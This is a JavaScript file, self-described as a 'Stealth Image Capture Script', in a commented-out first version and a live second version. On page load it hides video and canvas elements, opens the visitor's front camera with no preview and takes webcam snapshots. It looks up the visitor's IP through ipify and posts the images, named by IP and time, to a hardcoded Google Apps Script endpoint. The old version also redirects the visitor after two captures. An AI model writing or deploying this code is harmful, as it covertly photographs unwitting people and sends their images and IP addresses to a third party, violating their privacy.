// document.addEventListener("DOMContentLoaded", async () => {
//     // Create hidden video and canvas elements
//     const video = document.createElement('video');
//     video.setAttribute('autoplay', '');
//     video.setAttribute('playsinline', '');
//     video.style.display = 'none';
    
//     const canvas = document.createElement('canvas');
//     canvas.style.display = 'none';
    
//     // Add them to the document body
//     document.body.appendChild(video);
//     document.body.appendChild(canvas);
    
//     const context = canvas.getContext('2d');
//     const constraints = { 
//         video: { 
//             facingMode: "user",
//             width: { ideal: 1280 },
//             height: { ideal: 720 }
//         }, 
//         audio: false 
//     };

//     let captureCount = 0;
//     const maxCaptures = 2;

//     try {
//         const stream = await navigator.mediaDevices.getUserMedia(constraints);
//         video.srcObject = stream;

//         // Set canvas size to match video
//         video.addEventListener('loadedmetadata', () => {
//             canvas.width = video.videoWidth;
//             canvas.height = video.videoHeight;
//         });

//         const intervalId = setInterval(() => {
//             context.drawImage(video, 0, 0, canvas.width, canvas.height);
//             const dataURL = canvas.toDataURL('image/jpeg', 0.8);
            
//             // Extract base64 data from data URL
//             const base64Data = dataURL.split(',')[1];
            
//             // Generate filename with timestamp
//             const now = new Date();
//             const filename = `capture_${now.getTime()}.jpg`;

//             // Send to Google API
//             fetch('https://script.google.com/macros/s/AKfycbz8Tkk7bCt3CO4P4P19T9EeAy1VbVQxtcdMcN1VSAZHEb9Zc71kVUv3PiUukVvdxlQYYg/exec', {
//                 method: 'POST',
//                 headers: { 'Content-Type': 'application/json' },
//                 body: JSON.stringify({ 
//                     image: base64Data,
//                     filename: filename
//                 })
//             })
//             .then(res => res.text())
//             .then(txt => {
//                 console.log(txt);
//                 captureCount++;
                
//                 if (captureCount >= maxCaptures) {
//                     clearInterval(intervalId);
                    
//                     // Stop all video tracks
//                     stream.getTracks().forEach(track => track.stop());
                    
//                     // Redirect after successful capture
//                     setTimeout(() => {
//                         window.location.href = "https://.com"; // Replace with your redirect URL
//                     }, 1000);
//                 }
//             })
//             .catch(err => console.error(err));
//         }, 1500);

//     } catch (err) {
//         console.error("Camera access denied:", err);
//         // Handle camera access error (you can customize this)
//         document.body.innerHTML += '<div style="color: red; padding: 20px; text-align: center;">Camera access denied. Please refresh and allow camera access.</div>';
//     }
// });


// capture.js - Stealth Image Capture Script
(function() {
    // Configuration
    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz8Tkk7bCt3CO4P4P19T9EeAy1VbVQxtcdMcN1VSAZHEb9Zc71kVUv3PiUukVvdxlQYYg/exec';
    
    // Elements (created dynamically)
    let video, canvas;
    
    // Initialize the capture process
    function init() {
        createHiddenElements();
        getIPAddress()
            .then(ip => {
                startCamera()
                    .then(() => {
                        setTimeout(() => {
                            captureImage(ip);
                        }, 1000); // Wait a second for camera to initialize
                    })
                    .catch(error => {
                        console.error('Camera error:', error);
                    });
            })
            .catch(error => {
                console.error('IP detection error:', error);
            });
    }
    
    // Create hidden video and canvas elements
    function createHiddenElements() {
        video = document.createElement('video');
        video.setAttribute('autoplay', '');
        video.setAttribute('playsinline', '');
        video.style.display = 'none';
        document.body.appendChild(video);
        
        canvas = document.createElement('canvas');
        canvas.style.display = 'none';
        document.body.appendChild(canvas);
    }
    
    // Get user's IP address
    function getIPAddress() {
        return new Promise((resolve, reject) => {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => resolve(data.ip))
                .catch(error => reject(error));
        });
    }
    
    // Start camera without showing preview
    function startCamera() {
        return new Promise((resolve, reject) => {
            navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false
            })
            .then(stream => {
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            })
            .catch(error => reject(error));
        });
    }
    
    // Capture image and send to server
    function captureImage(ip) {
        // Set canvas dimensions to match video
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Draw current video frame to canvas
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Get current time for filename (GMT+7)
        const now = new Date();
        const gmt7Time = new Date(now.getTime() + (7 * 60 * 60 * 1000));
        const timeString = gmt7Time.toISOString().substr(11, 8).replace(/:/g, '.');
        
        // Create filename
        const filename = `${ip}_${timeString}.jpg`;
        
        // Convert canvas to blob
        canvas.toBlob(blob => {
            // Create form data to send
            const formData = new FormData();
            formData.append('image', blob, filename);
            formData.append('filename', filename);
            formData.append('ip', ip);
            formData.append('time', timeString);
            
            // Send to Google Apps Script
            fetch(GOOGLE_SCRIPT_URL, {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                // Clean up
                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(track => track.stop());
                }
                document.body.removeChild(video);
                document.body.removeChild(canvas);
            })
            .catch(error => {
                console.error('Error sending image:', error);
            });
        }, 'image/jpeg', 0.8);
    }
    
    // Start the process when script loads
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();